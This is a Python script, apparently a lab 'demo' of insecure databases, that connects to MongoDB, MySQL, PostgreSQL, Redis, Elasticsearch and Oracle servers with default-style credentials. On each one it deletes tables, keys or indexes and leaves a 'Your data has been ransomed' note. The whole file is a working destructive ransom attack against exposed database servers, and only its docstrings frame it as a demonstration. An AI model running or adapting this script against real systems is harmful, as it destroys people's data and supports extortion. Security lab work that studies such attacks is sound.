import pymongo
import mysql.connector
import psycopg2
import redis
from elasticsearch import Elasticsearch
import oracledb
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

WARNING_MESSAGE = "Your data has been ransomed"

def mongodb_demo():
    """Demonstrates MongoDB vulnerability"""
    try:
        client = pymongo.MongoClient("mongodb://root:example@192.168.1.11:27017/")
        db = client["my_database"]
        if "users" in db.list_collection_names():
            db["users"].rename("WARNING")
        warning_collection = db["WARNING"]
        warning_collection.delete_many({})
        warning_collection.insert_one({"message": WARNING_MESSAGE})
        logger.info("MongoDB demo completed")
    except Exception as e:
        logger.error(f"MongoDB demo failed: {str(e)}")

def mysql_demo():
    """Demonstrates MySQL vulnerability"""
    try:
        conn = mysql.connector.connect(
            host="192.168.1.12",
            user="root",
            password="example",
            database="my_database"
        )
        cursor = conn.cursor()
        
        # Drop the users table
        cursor.execute("DROP TABLE IF EXISTS my_table")
        
        # Create new WARNING table
        cursor.execute("""
            CREATE TABLE WARNING (
                WARNING VARCHAR(255)
            )
        """)
        
        # Insert the warning message
        cursor.execute("INSERT INTO WARNING (WARNING) VALUES (%s)", 
                      ("Your data has been ransomed",))
        
        conn.commit()
        cursor.close()
        conn.close()
        logger.info("MySQL demo completed")
    except Exception as e:
        logger.error(f"MySQL demo failed: {str(e)}")

def postgresql_demo():
    """Demonstrates PostgreSQL vulnerability"""
    try:
        conn = psycopg2.connect(
            host="192.168.1.13",
            database="my_database",
            user="postgres",
            password="example"
        )
        cursor = conn.cursor()
        
        # Drop the users table
        cursor.execute("DROP TABLE IF EXISTS my_table")
        
        # Create new WARNING table
        cursor.execute("""
            CREATE TABLE WARNING (
                WARNING VARCHAR(255)
            )
        """)

        # Insert the warning message
        cursor.execute("INSERT INTO WARNING (WARNING) VALUES (%s)", 
                      ("Your data has been ransomed",))
        
        conn.commit()
        cursor.close()
        conn.close()
        logger.info("PostgreSQL demo completed")
    except Exception as e:
        logger.error(f"PostgreSQL demo failed: {str(e)}")

def redis_demo():
    """Demonstrates Redis vulnerability"""
    try:
        r = redis.Redis(host='192.168.1.14', port=6379, db=0)
        keys = r.keys('user:*')
        for key in keys:
            r.delete(key)
        r.set("WARNING", WARNING_MESSAGE)
        logger.info("Redis demo completed")
    except Exception as e:
        logger.error(f"Redis demo failed: {str(e)}")

def elasticsearch_demo():
    """Demonstrates Elasticsearch vulnerability"""
    try:
        es = Elasticsearch(['http://192.168.1.15:9200'])
        es.indices.delete(index='my_index', ignore=[400, 404])
        es.indices.create(index='warning', ignore=400)
        es.index(index='warning', document={'message': WARNING_MESSAGE})
        logger.info("Elasticsearch demo completed")
    except Exception as e:
        logger.error(f"Elasticsearch demo failed: {str(e)}")

def oracle_demo():
    """Demonstrates Oracle vulnerability"""
    try:
        conn = oracledb.connect(
            user="my_database",
            password="my_password",
            dsn="192.168.1.16:1521/MYDB"
        )
        cursor = conn.cursor()
        
        # Drop the users table
        cursor.execute("DROP TABLE IF EXISTS my_table")
        
        # Create new WARNING table
        cursor.execute("""
            CREATE TABLE WARNING (
                WARNING VARCHAR(255)
            )
        """)
        
        #cursor.execute("RENAME users TO WARNING")
        #cursor.execute("DELETE FROM WARNING")
        #cursor.execute("INSERT INTO WARNING (message) VALUES (:1)", [WARNING_MESSAGE])
        
        # Insert the warning message
        cursor.execute("INSERT INTO WARNING (warning) VALUES (:1)", [WARNING_MESSAGE])
        
        #cursor.execute("INSERT INTO WARNING (message) VALUES (:1)", [WARNING_MESSAGE])
        #cursor.execute("INSERT INTO WARNING (WARNING) VALUES (%s)", 
        #              ("Your data has been ransomed",))
        
        conn.commit()
        cursor.close()
        conn.close()
        logger.info("Oracle demo completed")
    except Exception as e:
        logger.error(f"Oracle demo failed: {str(e)}")

def run_all_demos():
    """Runs all database security demonstrations"""
    demos = [
        mongodb_demo,
        mysql_demo,
        postgresql_demo,
        redis_demo,
        elasticsearch_demo,
        oracle_demo
    ]
    
    for demo in demos:
        try:
            demo()
        except Exception as e:
            logger.error(f"Failed to run {demo.__name__}: {str(e)}")

if __name__ == "__main__":
    run_all_demos()
